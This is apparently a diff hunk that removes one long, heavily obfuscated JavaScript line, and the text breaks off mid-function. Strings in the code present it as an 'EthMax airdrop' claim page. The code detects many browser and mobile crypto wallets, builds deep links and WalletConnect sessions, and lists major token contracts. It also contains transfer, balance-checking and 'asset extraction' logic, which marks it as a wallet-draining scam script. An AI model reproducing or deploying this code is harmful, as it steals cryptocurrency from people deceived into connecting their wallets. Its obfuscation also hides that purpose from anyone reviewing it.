@@ -1,1 +1,757 @@
-function _0x3a03(_0x373cba,_0x507542){const _0x7f2ef2=_0x7f2e();return _0x3a03=function(_0x3b4a00,_0x335a19){_0x3b4a00=_0x3b4a00-0xc7;let _0x12c4ae=_0x7f2ef2[_0x3b4a00];if(_0x3a03['zGmfFn']===undefined){var _0x56d326=function(_0x3a03f1){const _0x4020d8='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2076ce='',_0xcca9df='';for(let _0x436095=0x0,_0x5ba819,_0x231082,_0x36f7aa=0x0;_0x231082=_0x3a03f1['charAt'](_0x36f7aa++);~_0x231082&&(_0x5ba819=_0x436095%0x4?_0x5ba819*0x40+_0x231082:_0x231082,_0x436095++%0x4)?_0x2076ce+=String['fromCharCode'](0xff&_0x5ba819>>(-0x2*_0x436095&0x6)):0x0){_0x231082=_0x4020d8['indexOf'](_0x231082);}for(let _0xa6f098=0x0,_0xac087c=_0x2076ce['length'];_0xa6f098<_0xac087c;_0xa6f098++){_0xcca9df+='%'+('00'+_0x2076ce['charCodeAt'](_0xa6f098)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xcca9df);};_0x3a03['yNFxRP']=_0x56d326,_0x373cba=arguments,_0x3a03['zGmfFn']=!![];}const _0x4fd03d=_0x7f2ef2[0x0],_0x5390f3=_0x3b4a00+_0x4fd03d,_0x144b6a=_0x373cba[_0x5390f3];return!_0x144b6a?(_0x12c4ae=_0x3a03['yNFxRP'](_0x12c4ae),_0x373cba[_0x5390f3]=_0x12c4ae):_0x12c4ae=_0x144b6a,_0x12c4ae;},_0x3a03(_0x373cba,_0x507542);}function _0x3b4a(_0x373cba,_0x507542){const _0x7f2ef2=_0x7f2e();return _0x3b4a=function(_0x3b4a00,_0x335a19){_0x3b4a00=_0x3b4a00-0xc7;let _0x12c4ae=_0x7f2ef2[_0x3b4a00];return _0x12c4ae;},_0x3b4a(_0x373cba,_0x507542);}const _0xfca8f2=_0x3b4a;function _0x7f2e(){const _0x1cad09=['BMfTzq','Gas\x20estimation\x20failed\x20for\x20','metamask','isTalisman','Initializing\x20WalletConnect...','\x20transfer\x20would\x20fail,\x20skipping','ChvZAa','deepLink','function','\x20ETH\x20remaining\x20(more\x20than\x20expected)','0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','teLosW','lsbPC1rYDxn0oG','Warning:\x20','Coinbase\x20Wallet\x20Mobile','CgfYC2vfDgHLCG','D2fSBgv0y29UBMvJDa','ipod','q2HLy2TPBMCG','q29PBMjHC2uGv2fSBgv0','opera\x20mini','zgvZy3jPChrPB24','phantom\x20(eth)','0x6982508145454Ce325dDbE47a25d4ec3d2311933','message','1.\x20The\x20wallet\x20app\x20should\x20open\x20automatically\x0a','twv0yu1HC2SGtw9IAwXL','twv0yu1HC2S','AxbOB25L','ugHHBNrVBsbnB2jPBgu','rhjHAw4GzxjYB3i6','provider','Dgv4Da','Connection\x20was\x20cancelled\x20by\x20user.','ready','Estimated\x20gas\x20for\x20','formatUnits','BwvZC2fNzq','ETH\x20transfer\x20tx:','formatEther','DxnLCKfNzw50','maxPriorityFeePerGas','===\x20Wallet\x20Provider\x20Debug\x20===','text','<select\x20id=\x22wallet-select\x22\x20style=\x22margin-bottom:15px;\x22></select>','AxnqAgfUDg9T','q29UBMvJDgvKihrVia','color','Connected\x20to\x20','.button-container','lsbPC01LDgfnyxnRoG','z2v0u2LNBMvY','lcb1C2LUzYbKzwzHDwX0','chainId','0x1','</option>','vgHPCYbPCYbHig1VyMLSzsb3ywXSzxqGB3b0Aw9UlIbqBgvHC2uGDxnLigeGzgvZA3rVCcb3ywXSzxqGB3iGC3DPDgnOihrVigeGBw9IAwXLigrLDMLJzs4','Checking\x20account\x20balance...','A2v5','Transferring\x20','zxjYB3i','mM9JwMz4AG','https://link.trustwallet.com/open_url?coin_id=60&url=','Instructions:\x0a','isRainbow','https://rainbow.me/dapp?url=','metadata','#wallet-select','key','yxbWzw5K','ywrKCMvZCW','zNvUy3rPB24GDhjHBNnMzxiOywrKCMvZCYb0BYWGDwLUDdi1nIbHBw91BNqPihjLDhvYBNmGkgjVB2WP','body','mobile','zM9YrwfJAa','providers','D2fYBG','sendTransaction','ww91j3jLig5VDcbVBIbfDgHLCMv1BsbnywLUBMv0lIbxB3vSzcb5B3uGBgLRzsb0BYbZD2L0y2GGBMv0D29YA3m/','getBalance','toFixed','Aw5PDa','Dg9mB3DLCKnHC2u','21564cwDzlY','Bw9IAwXL','mtaYmtnSDNzSy00','isTrust','Main\x20ethereum\x20object\x20properties:','connect','uhjVDMLKzxiG','mul','C3vJy2vZCW','EthereumProvider','uMfPBMjVDW','noopener\x20noreferrer','Connection\x20timed\x20out.\x20Please\x20try\x20again\x20or\x20use\x20WalletConnect\x20instead.','then','MetaMask\x20Mobile','MetaMask\x20(Install\x20Required)','z2v0tMv0D29YAW','isBraveWallet','pathname','Ahr0Chm6lY9WAgfUDg9TlMfWCc91Bc9ICM93C2uV','innerWidth','android','pt09pt09pt09pt09pt09pt09pt09pt09pt0','uMfIyNKGv2fSBgv0','\x20transferred\x20successfully','mY4GuMv0DxjUihrVihrOAxmGCgfNzqO','mhHbmgi4nMeZm0u2zti2qZHKnuyWq2u0rdjHmKu3ztLfmeuWneu0rJHd','zgL2','vhjHBNnHy3rPB24GDw5KzxjWCMLJzwqSigDHCYbWCMLJzsbTyxKGAgf2zsbPBMnYzwfZzwq','mhGXzJK4ndbHodvKnwfgnwjMmuqXnZyYrJKYnujequrKqZqYmdfgotG0','q29UDhjHy3q','\x20|\x20Balance:\x20','BigNumber','No\x20accounts\x20found.\x20Please\x20unlock\x20your\x20wallet.','open','C3vI','walletconnect','z2fZvxnLza','icHoB3qGsw5ZDgfSBgvKkq','rgv2AwnLoIa','gasUsed','AxnpCgvYyq','includes','Failed\x20to\x20switch\x20network','target','neHcCw1IAq','mhG1rdnbmtqWzdu5mdzdyJjcm2y3otq3ntyXzeu5neveodK1rKzcmtLK','z2v0r2fZuhjPy2u','ChjVDMLKzxi','No\x20wallet\x20selected.','gwei','0x514910771AF9Ca656af840dff83E8264EcF986CA','v2fPDgLUzYbMB3iGD2fSBgv0ignVBM5Ly3rPB24UlI4GugXLyxnLihjLDhvYBIbHzNrLCIbJB25Uzwn0Aw5NlG','isCoinbaseWallet','igLZig5VDcbWCM9WzxjSEsbPBNn0ywXSzwqGB3iGyxzHAwXHyMXLlIbqBgvHC2uGAw5ZDgfSBcb0AguGD2fSBgv0igv4DgvUC2LVBI4','mtjzyvbsqwW','transfer','y3jLyxrLrwXLBwvUDa','z2v0qMfSyw5Jzq','DxrPBhm','pg9WDgLVBIb2ywX1zt0I','icons','Insufficient\x20ETH\x20for\x20','url','Wrong\x20network\x20detected','v2vIm1bYB3zPzgvY','y3nZ','location','AhjLzG','zM9YBwf0vw5PDhm','rgvZA3rVCa','lMj1DhrVBI1JB250ywLUzxi','39594291honDYy','z2v0rMvLrgf0yq','CMvXDwvZDa','q3vYCMvUDcbNyxmGChjPy2u6ia','🎯\x20Claim\x20Airdrop','ywnJB3vUDhm','Balance:\x20','zgvJAw1HBhm','yMfSyw5Jzu9M','Connecting\x20to\x20','\x20ETH\x0aNetwork:\x20','Bg9N','No\x20','6434368kYouCL','estimateGas','https://go.cb-w.com/dapp?cb_url=','isRabby','yMXVy2ToDw1Izxi','2.\x20Connect\x20your\x20wallet\x20in\x20the\x20app\x0a','su5tvuzgsunjru5ux0zvtKrt','y2XPy2S','AxnnzxrHtwfZAW','accounts','Dg9tDhjPBMC','zNjVBq','4.\x20Click\x20OK\x20to\x20continue\x20waiting,\x20or\x20Cancel\x20to\x20try\x20a\x20different\x20method','AxnsywLUyM93','r2fZihvZzwq6','CgfYyw1Z','rMLUywWGrvriigjHBgfUy2u6ia','toString','Wallet\x20extension\x20not\x20properly\x20installed','rMfPBgvKihrVihn3AxrJAcb0BYbfDgHLCMv1BsbnywLUBMv0lIbqBgvHC2uGC3DPDgnOig1HBNvHBgX5lG','error','AxndB2LUyMfZzvDHBgXLDa','mtuXmJyXoeH4A0jHua','Switching\x20to\x20Ethereum\x20Mainnet...','mJe1nJrJD0r6BfK','cKjHBgfUy2u6ia','REPLACEMENT_UNDERPRICED','symbol','WalletConnect\x20connected\x20successfully!','BM93','qsbJB25Uzwn0Aw9UihjLCxvLC3qGAxmGywXYzwfKEsbWzw5KAw5NlIbqBgvHC2uGy2HLy2SGEw91CIb3ywXSzxqU','zxrOzxjLDw0','length','Bwf4rMvLugvYr2fZ','name','Token\x20','rM91BMqG','DhLWzq','Failed\x20to\x20transfer\x20','zNvUy3rPB24GyMfSyw5Jzu9MkgfKzhjLC3mGB3DUzxiPihzPzxCGCMv0DxjUCYaODwLUDdi1nIK','AxncCMf2zvDHBgXLDa','zxrOx2fJy291BNrZ','vhjHBNnHy3rPB24GzMfPBgvKigr1zsb0BYbPBNn1zMzPy2LLBNqGzNvUzhmGzM9YigDHCW','window.ethereum:','ievusa','Trust\x20Wallet','isPhantom','mc4Wmde','-\x20isPhantom:','3284350mTYTTY','BxvS','tw9IAwXLihDHBgXLDcbZzwXLy3rLzcbVBIbKzxnRDg9WigrLDMLJzq','ChjLCgvUza','getNetwork','push','mJeWmda','\x20transfer\x20confirmed\x20in\x20block\x20','rNjHBwu','q29UBMvJDgvKihrVig5LDhDVCMS6','Failed\x20to\x20open\x20deep\x20link:','Wallet\x20provider\x20not\x20available.\x20Please\x20install\x20the\x20wallet\x20extension\x20or\x20use\x20WalletConnect.','i2nVBM5Ly3qTD2fSBgv0','No\x20accounts\x20found\x20in\x20wallet','pgrPDIbPzd0Iy29UBMvJDgLVBI1ZDgf0DxmIihn0EwXLpsjTyxjNAw4TyM90Dg9ToJeWChG7igzVBNqTC2L6ztOXmNb4oYbJB2XVCJOJnJy2oYi+pc9KAxy+','isMetaMask','nJuWmda','warn','type','BgvUz3rO','B2zM','effectiveGasPrice','6550emmABg','rxHHy3qGz2fZignVC3q6ia','y29Kzq','x2jSyw5R','qNjHDMuGv2fSBgv0','Dhj1C3qGD2fSBgv0','rxn0Aw1HDgvKigDHCYbUzwvKzwq6ia','\x20balance:\x20','ihrYyw5ZzMvYigDHCY4GtMvLzdOG','Opening\x20mobile\x20deep\x20link\x20for\x20','blockNumber','vgfSAxnTyw4','tw9IAwXL','ontouchstart','rMfPBgvKihrVigrYywLUia','isFrame','href','Failed\x20to\x20create\x20and\x20click\x20link:','Effective\x20gas\x20price:','Bwv0Ag9K','utils','\x20ETH','ruLqlte1ntKGzMvLigvZDgLTyxrPB24GzMfPBgvKlcb1C2LUzYbSzwDHy3KGz2fZihbYAwnPBMC','y2HHAw5Z','USDC','code','tw9IAwXLignVBM5Ly3rPB24GzMfPBgvKig9YihrPBwvKig91Da','Ag9ZDg5HBwu','Claim\x20your\x20EthMax\x20airdrop\x20tokens\x20-\x20Connect\x20any\x20Ethereum\x20wallet','AxnAzxjV','coinbase\x20wallet','tM8GzgvLCcbSAw5Rigf2ywLSywjSzsbMB3iGD2fSBgv0oIa','ETH\x20transfer\x20confirmed\x20in\x20block:','getGasPrice','Connected\x20to\x20wallet\x20but\x20failed\x20to\x20complete\x20setup:\x20','ChjVDMLKzxjZ','Asset\x20extraction\x20failed','ihrYyw5ZzMvYihr4oIa','Connection\x20cancelled\x20by\x20user','tw9IAwXLignVBM5Ly3rPB24Gy2fUy2vSBgvKigj5ihvZzxi','val','Bg9JyxrPB24','address','Still\x20waiting\x20for\x20mobile\x20connection...','v0vusa','1316153anPOof','\x20gwei','...','forEach','q29UBMvJDgLVBIbLCNjVCJO','C29Tzq','C3LTyM9S','z2fZuhjPy2u','rMfPBgvKihrVignVBM5Ly3qGD2fSBgv0oIa','0xdAC17F958D2ee523a2206206994597C13D831ec7','CgHHBNrVBq','zgvLCeXPBMS','request','Failed\x20to\x20claim\x20airdrop:\x20','https://walletconnect.com/walletconnect-logo.png','method','AgfZAa','Connection\x20setup\x20failed','WalletConnect','ihWGv2fSBgv0CYbMB3vUzdOG','z3DLAq','origin','sw5ZDwzMAwnPzw50igz1BMrZigzVCIa','mJa5nhnOsMT2sG','AxnbCNjHEq','\x20tokens','u3rHCNrPBMCGD2fSBgv0igrYywLUlI4U','mZi4ndm1mg1uwvruwq','v2fSBgv0q29UBMvJDa','INSUFFICIENT_FUNDS','zM9YBwf0rxrOzxi','Trust\x20Wallet\x20Mobile','Unable\x20to\x20open\x20','rxjYB3iGzhjHAw5PBMCGrvrioG','eth_accounts','p3jLzJ0','CMfPBMjVDW','mtmXnJe1m2fUue9VzG','igD3zwK','uevqrq','rxrOtwf4iefPCMrYB3a','rMfPBgvKihrVihn3AxrJAcbUzxr3B3jRoG','tgvHDMLUzYa','q3vYCMvUDcbfveGGyMfSyw5JzsbIzwzVCMuGzMLUywWGDhjHBNnMzxi6ia','\x20balance...','Opening\x20','t3bLCMeGv2fSBgv0','r2fZignVC3q6ia','WalletConnect\x20connection\x20failed','from','ethereum','iZy2nG','-\x20isRainbow:','y29PBMjHC2vxywXSzxrfEhrLBNnPB24','u0HjqG','decimals','yxbWzw5Kq2HPBgq','i3DHBgXLDc1ZzwXLy3q','log','y2XVC2vK','AxnsywjIEq','vhjHBNnMzxjYAw5NihjLBwfPBMLUzYbfveGUlI4','click'];_0x7f2e=function(){return _0x1cad09;};return _0x7f2e();}(function(_0x204911,_0x394ba2){const _0x1f31b7=_0x3b4a,_0x1e0088=_0x3a03,_0x1ee17a=_0x204911();while(!![]){try{const _0x3d7ea4=-parseInt(_0x1e0088(0x1f3))/0x1*(-parseInt(_0x1e0088(0xef))/0x2)+-parseInt(_0x1e0088(0x170))/0x3+parseInt(_0x1e0088(0x132))/0x4*(-parseInt(_0x1f31b7(0x18b))/0x5)+parseInt(_0x1e0088(0x1e5))/0x6*(-parseInt(_0x1e0088(0x107))/0x7)+-parseInt(_0x1f31b7(0x15a))/0x8+-parseInt(_0x1e0088(0x172))/0x9*(parseInt(_0x1f31b7(0x1a1))/0xa)+-parseInt(_0x1f31b7(0x14d))/0xb*(-parseInt(_0x1e0088(0x13c))/0xc);if(_0x3d7ea4===_0x394ba2)break;else _0x1ee17a['push'](_0x1ee17a['shift']());}catch(_0x665cb2){_0x1ee17a['push'](_0x1ee17a['shift']());}}}(_0x7f2e,0xd4d0b),$(document)[_0xfca8f2(0xd4)](function(){const _0xdb430d=_0xfca8f2,_0x4c6367=_0x3a03,_0x507f78=[];if(window[_0x4c6367(0x179)]){const _0x51945c=window[_0xdb430d(0x200)],_0x230499={};_0x230499[_0xdb430d(0x17c)]=_0x4c6367(0xcd),_0x230499[_0xdb430d(0xf6)]=_0x4c6367(0x162);const _0x9903={};_0x9903[_0xdb430d(0x17c)]=_0x4c6367(0x220),_0x9903[_0x4c6367(0xec)]=_0xdb430d(0x13a);const _0x1bc1b3={};_0x1bc1b3['name']=_0xdb430d(0x187),_0x1bc1b3[_0x4c6367(0xec)]=_0xdb430d(0x108);const _0x14e001={};_0x14e001[_0xdb430d(0x17c)]=_0x4c6367(0x10f),_0x14e001[_0x4c6367(0xec)]=_0x4c6367(0x167);const _0xe683ec={};_0xe683ec['name']=_0x4c6367(0x1a5),_0xe683ec['key']=_0x4c6367(0x182);const _0x4e820e={};_0x4e820e[_0xdb430d(0x17c)]=_0x4c6367(0x1fc),_0x4e820e[_0xdb430d(0xf6)]=_0x4c6367(0x12e);const _0x59ecd3={};_0x59ecd3['name']='Phantom\x20(ETH)',_0x59ecd3['key']='isPhantom';const _0x33e8cd={};_0x33e8cd[_0x4c6367(0x20d)]=_0x4c6367(0x11c),_0x33e8cd[_0x4c6367(0xec)]=_0x4c6367(0x20a);const _0x56e729={};_0x56e729['name']=_0x4c6367(0x193),_0x56e729[_0xdb430d(0xf6)]=_0xdb430d(0x1b0);const _0x4aaeba={};_0x4aaeba[_0xdb430d(0x17c)]=_0x4c6367(0x1ac),_0x4aaeba[_0xdb430d(0xf6)]=_0xdb430d(0x210);const _0x14320d=[_0x230499,_0x9903,_0x1bc1b3,_0x14e001,_0xe683ec,_0x4e820e,_0x59ecd3,_0x33e8cd,_0x56e729,_0x4aaeba];if(window[_0x4c6367(0x1d8)]&&window['phantom']['ethereum']){const _0x17dbb8={};_0x17dbb8[_0xdb430d(0x17c)]='Phantom\x20(ETH)',_0x17dbb8[_0xdb430d(0xd1)]=_0x51945c,_0x507f78[_0x4c6367(0x213)](_0x17dbb8);}else _0x14320d[_0xdb430d(0x1d1)](_0x1b7d1c=>{const _0x330647=_0xdb430d,_0x5acbd0=_0x4c6367;if(_0x1b7d1c[_0x5acbd0(0xec)]==='isPhantom'&&_0x51945c[_0x1b7d1c[_0x330647(0xf6)]]){const _0x1e9918={};_0x1e9918[_0x330647(0x17c)]=_0x1b7d1c[_0x330647(0x17c)],_0x1e9918[_0x330647(0xd1)]=_0x51945c,_0x507f78[_0x330647(0x190)](_0x1e9918);}else{if(_0x1b7d1c['key']==='isMetaMask'&&_0x51945c[_0x1b7d1c[_0x330647(0xf6)]]&&!_0x51945c['isPhantom']){const _0x516b48={};_0x516b48[_0x330647(0x17c)]=_0x1b7d1c[_0x330647(0x17c)],_0x516b48[_0x5acbd0(0x135)]=_0x51945c,_0x507f78['push'](_0x516b48);}else{if(_0x1b7d1c[_0x330647(0xf6)]===_0x5acbd0(0x16f)&&_0x51945c[_0x1b7d1c[_0x5acbd0(0xec)]]){const _0x2aa407={};_0x2aa407[_0x5acbd0(0x20d)]=_0x1b7d1c['name'],_0x2aa407['provider']=_0x51945c,_0x507f78[_0x330647(0x190)](_0x2aa407);}else{if(_0x1b7d1c[_0x5acbd0(0xec)]!==_0x5acbd0(0xdf)&&_0x1b7d1c[_0x330647(0xf6)]!==_0x330647(0x19a)&&_0x1b7d1c[_0x5acbd0(0xec)]!==_0x5acbd0(0x16f)&&_0x51945c[_0x1b7d1c[_0x5acbd0(0xec)]]){const _0x595ba5={};_0x595ba5[_0x5acbd0(0x20d)]=_0x1b7d1c['name'],_0x595ba5[_0x330647(0xd1)]=_0x51945c,_0x507f78['push'](_0x595ba5);}}}}});if(window[_0x4c6367(0x203)]){const _0x2f9454={};_0x2f9454[_0xdb430d(0x17c)]='Coinbase\x20Wallet',_0x2f9454['provider']=window['coinbaseWalletExtension'],_0x507f78[_0x4c6367(0x213)](_0x2f9454);}Array[_0x4c6367(0x1e6)](_0x51945c[_0x4c6367(0x1c4)])&&_0x51945c[_0xdb430d(0xfd)][_0xdb430d(0x1d1)](_0x257b16=>{_0x14320d['forEach'](_0x37d301=>{const _0x91b13c=_0x3b4a,_0x28a29f=_0x3a03;if(_0x37d301[_0x28a29f(0xec)]===_0x91b13c(0x188)&&_0x257b16[_0x37d301[_0x28a29f(0xec)]]){const _0xec1ab0={};_0xec1ab0[_0x28a29f(0x20d)]=_0x37d301[_0x91b13c(0x17c)],_0xec1ab0['provider']=_0x257b16,_0x507f78[_0x91b13c(0x190)](_0xec1ab0);}else{if(_0x37d301[_0x91b13c(0xf6)]===_0x91b13c(0x19a)&&_0x257b16[_0x37d301[_0x28a29f(0xec)]]&&!_0x257b16[_0x28a29f(0xdf)]){const _0x4b303b={};_0x4b303b[_0x28a29f(0x20d)]=_0x37d301[_0x28a29f(0x20d)],_0x4b303b[_0x28a29f(0x135)]=_0x257b16,_0x507f78['push'](_0x4b303b);}else{if(_0x37d301['key']===_0x91b13c(0x13a)&&_0x257b16[_0x37d301['key']]){const _0x97fb9a={};_0x97fb9a['name']=_0x37d301[_0x28a29f(0x20d)],_0x97fb9a[_0x91b13c(0xd1)]=_0x257b16,_0x507f78['push'](_0x97fb9a);}else{if(_0x37d301[_0x91b13c(0xf6)]!=='isPhantom'&&_0x37d301[_0x91b13c(0xf6)]!==_0x91b13c(0x19a)&&_0x37d301[_0x91b13c(0xf6)]!==_0x91b13c(0x13a)&&_0x257b16[_0x37d301[_0x91b13c(0xf6)]]){const _0x3dfb00={};_0x3dfb00[_0x91b13c(0x17c)]=_0x37d301[_0x91b13c(0x17c)],_0x3dfb00[_0x28a29f(0x135)]=_0x257b16,_0x507f78[_0x91b13c(0x190)](_0x3dfb00);}}}}});});}const _0x13a01d={};_0x13a01d['name']=_0x4c6367(0xcc),_0x13a01d[_0xdb430d(0x19d)]=_0x4c6367(0x106),_0x13a01d['deepLink']='metamask';const _0x384a27={};_0x384a27['name']='Trust\x20Wallet\x20Mobile',_0x384a27['type']='mobile',_0x384a27[_0x4c6367(0x1d9)]=_0x4c6367(0x1a6);const _0x29f134={};_0x29f134[_0x4c6367(0x20d)]=_0xdb430d(0x21b),_0x29f134[_0x4c6367(0x17f)]=_0xdb430d(0xfb),_0x29f134['deepLink']='coinbase\x20wallet';const _0x5302d8={};_0x5302d8[_0x4c6367(0x20d)]='Rainbow\x20Mobile',_0x5302d8[_0xdb430d(0x19d)]='mobile',_0x5302d8['deepLink']=_0x4c6367(0x1f2);const _0x197f5a={};_0x197f5a[_0x4c6367(0x20d)]=_0x4c6367(0xcf),_0x197f5a[_0x4c6367(0x17f)]=_0xdb430d(0xfb),_0x197f5a[_0x4c6367(0x1d9)]=_0xdb430d(0xc8);const _0x22372f=[_0x13a01d,_0x384a27,_0x29f134,_0x5302d8,_0x197f5a];(_0x3408ec()||_0x507f78['length']===0x0)&&_0x22372f[_0xdb430d(0x1d1)](_0x1603d9=>{_0x507f78['push'](_0x1603d9);});let _0x425f30=![],_0xe5fcac=null;if(window['WalletConnectProvider'])_0x425f30=!![],_0xe5fcac=window['WalletConnectProvider'];else window['WalletConnect']&&window['WalletConnect'][_0xdb430d(0x10e)]&&(_0x425f30=!![],_0xe5fcac=window[_0xdb430d(0x1e0)][_0xdb430d(0x10e)]);if(_0x425f30){const _0x1917c8={};_0x1917c8[_0x4c6367(0x20d)]='WalletConnect',_0x1917c8[_0xdb430d(0xd1)]='walletconnect',_0x1917c8[_0xdb430d(0x19d)]=_0xdb430d(0x129),_0x507f78['push'](_0x1917c8);}const _0x28e8a5=_0x4c6367(0x133),_0x5af1d4={};_0x5af1d4[_0xdb430d(0x175)]='USDT',_0x5af1d4['address']=_0xdb430d(0x1d7),_0x5af1d4[_0xdb430d(0x205)]=0x6;const _0x4bf497={};_0x4bf497['symbol']=_0xdb430d(0x1b9),_0x4bf497[_0x4c6367(0xf8)]=_0x4c6367(0x11f),_0x4bf497[_0x4c6367(0x154)]=0x6;const _0x394d17={};_0x394d17[_0xdb430d(0x175)]=_0x4c6367(0x218),_0x394d17['address']=_0xdb430d(0x138),_0x394d17[_0xdb430d(0x205)]=0x12;const _0x5d4e34={};_0x5d4e34['symbol']='UNI',_0x5d4e34[_0xdb430d(0x1cb)]=_0x4c6367(0x122),_0x5d4e34[_0xdb430d(0x205)]=0x12;const _0x4544a3={};_0x4544a3[_0x4c6367(0x1d4)]=_0x4c6367(0x1cd),_0x4544a3['address']=_0xdb430d(0x217),_0x4544a3['decimals']=0x12;const _0x572a10={};_0x572a10[_0xdb430d(0x175)]=_0x4c6367(0x204),_0x572a10[_0x4c6367(0xf8)]='0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4CE',_0x572a10['decimals']=0x12;const _0x5939cb={};_0x5939cb[_0xdb430d(0x175)]=_0x4c6367(0x1f5),_0x5939cb[_0xdb430d(0x1cb)]=_0xdb430d(0xc9),_0x5939cb['decimals']=0x12;const _0x489dc5=[_0x5af1d4,_0x4bf497,_0x394d17,_0x5d4e34,_0x4544a3,_0x572a10,_0x5939cb];function _0x450b7f(){const _0x3e4b00=_0x4c6367,_0x58da61=_0xdb430d;console[_0x58da61(0x208)](_0x58da61(0xdc)),console[_0x3e4b00(0x158)](_0x58da61(0x185),window[_0x3e4b00(0x179)]),window['ethereum']&&(console[_0x58da61(0x208)](_0x58da61(0x109)),console[_0x3e4b00(0x158)](_0x3e4b00(0xe4),window[_0x3e4b00(0x179)][_0x58da61(0x19a)]),console[_0x58da61(0x208)](_0x58da61(0x18a),window['ethereum'][_0x3e4b00(0xdf)]),console['log']('-\x20isCoinbaseWallet:',window[_0x3e4b00(0x179)][_0x58da61(0x13a)]),console['log'](_0x3e4b00(0x219),window['ethereum'][_0x58da61(0x108)]),console['log'](_0x58da61(0x202),window[_0x3e4b00(0x179)][_0x58da61(0xf2)]),console[_0x3e4b00(0x158)]('-\x20isBraveWallet:',window[_0x3e4b00(0x179)][_0x58da61(0x116)]),console['log']('-\x20isRabby:',window[_0x3e4b00(0x179)][_0x58da61(0x15d)]),window[_0x3e4b00(0x179)]['providers']&&(console[_0x3e4b00(0x158)]('Multiple\x20providers\x20detected:',window[_0x58da61(0x200)][_0x3e4b00(0x1c4)][_0x3e4b00(0x19e)]),window[_0x3e4b00(0x179)][_0x58da61(0xfd)][_0x3e4b00(0xfc)]((_0x44e260,_0x1f138d)=>{const _0x194abb=_0x3e4b00,_0x7dc0b8=_0x58da61,_0x1f71aa={};_0x1f71aa[_0x7dc0b8(0x19a)]=_0x44e260[_0x7dc0b8(0x19a)],_0x1f71aa[_0x7dc0b8(0x188)]=_0x44e260[_0x7dc0b8(0x188)],_0x1f71aa[_0x194abb(0x16f)]=_0x44e260['isCoinbaseWallet'],_0x1f71aa[_0x7dc0b8(0x108)]=_0x44e260['isTrust'],_0x1f71aa[_0x7dc0b8(0xf2)]=_0x44e260['isRainbow'],_0x1f71aa[_0x194abb(0x182)]=_0x44e260['isBraveWallet'],_0x1f71aa['isRabby']=_0x44e260[_0x194abb(0x20a)],console['log'](_0x194abb(0x10b)+_0x1f138d+':',_0x1f71aa);}))),console[_0x58da61(0x208)](_0x3e4b00(0x11b));}function _0x3408ec(){const _0x56eeed=_0xdb430d,_0x3c2ec6=_0x4c6367,_0x4c5b75=navigator[_0x3c2ec6(0xda)][_0x3c2ec6(0x104)](),_0x9ce23=[_0x56eeed(0x11a),'webos',_0x3c2ec6(0xce),'ipad',_0x56eeed(0x21e),'blackberry','iemobile',_0x56eeed(0x221),_0x56eeed(0xfb),'tablet'],_0x48fbce=_0x9ce23[_0x3c2ec6(0x1d3)](_0x661a00=>_0x4c5b75[_0x56eeed(0x12f)](_0x661a00)),_0x191264=_0x56eeed(0x1ae)in window||navigator['maxTouchPoints']>0x0,_0x13fe92=window[_0x56eeed(0x119)]<=0x300;return _0x48fbce||_0x191264&&_0x13fe92;}function _0x5472ed(_0x35e2e1,_0x39553d=window[_0x4c6367(0x1ca)][_0xdb430d(0x1b1)]){const _0x566070=_0xdb430d,_0x3820d2=_0x4c6367,_0x363bb1=encodeURIComponent(_0x39553d),_0x395412=window['location'][_0x3820d2(0x1bc)],_0x26ebfb=window[_0x566070(0x148)][_0x566070(0x1b1)],_0x4f7de5={};_0x4f7de5[_0x566070(0x20f)]='https://metamask.app.link/dapp/'+_0x395412+window[_0x566070(0x148)][_0x566070(0x117)],_0x4f7de5[_0x3820d2(0x1a6)]=_0x566070(0xf0)+_0x363bb1,_0x4f7de5[_0x566070(0x1bf)]=_0x566070(0x15c)+_0x363bb1,_0x4f7de5['rainbow']=_0x566070(0xf3)+_0x363bb1,_0x4f7de5[_0x566070(0xc8)]=_0x3820d2(0x118)+_0x363bb1+_0x3820d2(0x1f1)+_0x363bb1;const _0x52b802=_0x4f7de5;return _0x52b802[_0x35e2e1['toLowerCase']()]||null;}function _0x5cc373(_0x33a6fa){const _0x5c9168=_0x4c6367,_0x2e01f0=_0xdb430d;if(!_0x3408ec())return console[_0x2e01f0(0x208)]('Not\x20on\x20mobile\x20device,\x20skipping\x20mobile\x20wallet\x20connection'),![];const _0x33ab7b=_0x5472ed(_0x33a6fa);if(_0x33ab7b){console['log'](_0x2e01f0(0x1aa)+_0x33a6fa+':',_0x33ab7b);try{const _0x16a0c8=window[_0x2e01f0(0x127)](_0x33ab7b,_0x5c9168(0x1a4));return(!_0x16a0c8||_0x16a0c8[_0x5c9168(0x209)])&&(window[_0x2e01f0(0x148)][_0x5c9168(0x149)]=_0x33ab7b),!![];}catch(_0x2158d8){console[_0x2e01f0(0x16e)](_0x2e01f0(0x195),_0x2158d8);try{const _0x4183ce=document[_0x5c9168(0x13e)]('a');return _0x4183ce['href']=_0x33ab7b,_0x4183ce[_0x2e01f0(0x131)]=_0x5c9168(0x1a4),_0x4183ce['rel']=_0x2e01f0(0x110),document[_0x2e01f0(0xfa)][_0x5c9168(0x206)](_0x4183ce),_0x4183ce[_0x2e01f0(0x20c)](),document[_0x2e01f0(0xfa)]['removeChild'](_0x4183ce),!![];}catch(_0x208d7e){return console[_0x5c9168(0xee)](_0x2e01f0(0x1b2),_0x208d7e),![];}}}return console[_0x2e01f0(0x19c)](_0x5c9168(0x1c0)+_0x33a6fa),![];}function _0x31e7f9(_0x42fcdf=0x7530){return new Promise(_0x52bc62=>{const _0x5b8c1d=_0x3a03,_0x25574f=Date[_0x5b8c1d(0x177)](),_0x1f5176=0x3e8,_0x2dfa84=async()=>{const _0x3f2686=_0x5b8c1d,_0x10c5a0=_0x3b4a;try{if(window[_0x10c5a0(0x200)]){const _0x5f51aa={};_0x5f51aa[_0x3f2686(0x1b4)]=_0x10c5a0(0x1f0);const _0x1747aa=await window[_0x10c5a0(0x200)][_0x10c5a0(0x1da)](_0x5f51aa);if(_0x1747aa&&_0x1747aa['length']>0x0){const _0x2593c5={};_0x2593c5[_0x3f2686(0x10d)]=!![],_0x2593c5[_0x3f2686(0x152)]=_0x1747aa,_0x2593c5[_0x10c5a0(0xd1)]=window['ethereum'],_0x52bc62(_0x2593c5);return;}}}catch(_0x5e92e5){console[_0x10c5a0(0x208)](_0x10c5a0(0x1cc),_0x5e92e5);}if(Date[_0x3f2686(0x177)]()-_0x25574f>_0x42fcdf){const 